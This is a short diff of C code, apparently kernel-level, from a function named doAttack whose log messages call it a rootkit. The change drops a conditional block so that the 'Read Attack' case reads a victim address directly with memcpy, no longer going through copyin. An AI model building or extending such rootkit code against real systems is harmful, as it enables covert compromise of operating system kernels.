@@ -165,12 +165,8 @@ doAttack (struct thread * td) {
     case at_read: {
       printf ("Rootkit: doAttack: Read Attack\n");
       static char buffer[4096];
-#if 0
-      ret = copyin (victimAddr, buffer, victimLen); 
-#else
       __asm__ __volatile__ ("nop\n");
       memcpy (buffer, victimAddr, victimLen);
-#endif
       if (ret == EFAULT) {
         printf ("Rootkit: EFAULT at %lx\n", victimAddr);
       } else {
